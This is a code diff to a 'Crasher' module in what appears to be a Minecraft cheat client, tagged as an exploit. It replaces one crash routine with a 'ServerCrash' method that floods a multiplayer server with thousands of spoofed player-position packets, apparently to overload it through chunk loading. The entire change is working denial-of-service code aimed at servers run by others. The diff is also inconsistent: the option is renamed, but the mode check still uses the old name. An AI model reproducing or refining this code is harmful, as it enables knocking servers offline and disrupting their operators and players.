@@ -37,7 +37,7 @@ public class Crasher extends Module {
     public Crasher() {
         super("Crasher", Category.EXPLOIT);
         ArrayList<String> options = new ArrayList<>();
-        options.add("Massivechunkloading");
+        options.add("ServerCrash");
         options.add("Singlepacket");
         options.add("Fly");
         options.add("Exploitfix");
@@ -93,7 +93,7 @@ public class Crasher extends Module {
         if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
             Singlepacket();
         } else if (mode1.getValString().equalsIgnoreCase("Massivechunkloading")) {
-            Massivechunkoading();
+            ServerCrash();
         } else if (mode1.getValString().equalsIgnoreCase("Fly")) {
             Flycrasher();
         } else if (mode1.getValString().equalsIgnoreCase("Exploitfix")) {
@@ -193,12 +193,27 @@ public class Crasher extends Module {
         return stringBuilder.toString();
     }
 
-    public void Massivechunkoading() {
-        for (double yPos = this.mc.thePlayer.posY; yPos < 255.0D; yPos += 5.0D)
-            this.mc.getNetHandler().addToSendQueue((Packet) new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, yPos, this.mc.thePlayer.posZ, true));
-        for (int i = 0; i < 6685; i += 5)
-            this.mc.getNetHandler().addToSendQueue((Packet) new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX + i, 255.0D, this.mc.thePlayer.posZ + i, true));
-        toggle();
+    public void ServerCrash() {
+        if (mc.isSingleplayer()) {
+
+            return;
+        }
+        double playerX = mc.thePlayer.posX;
+        double playerY = mc.thePlayer.posY;
+        double playerZ = mc.thePlayer.posZ;
+        double y = 0;
+        double x = 0;
+        double z = 0;
+        for(int i = 0; i < 2000;) {
+            y = i * 9;
+            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
+            i++;
+        }
+        for(int i = 0; i < 10000;) {
+            z = i * 9;
+            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
+            i++;
+        }
     }
 
     public void Flycrasher() {
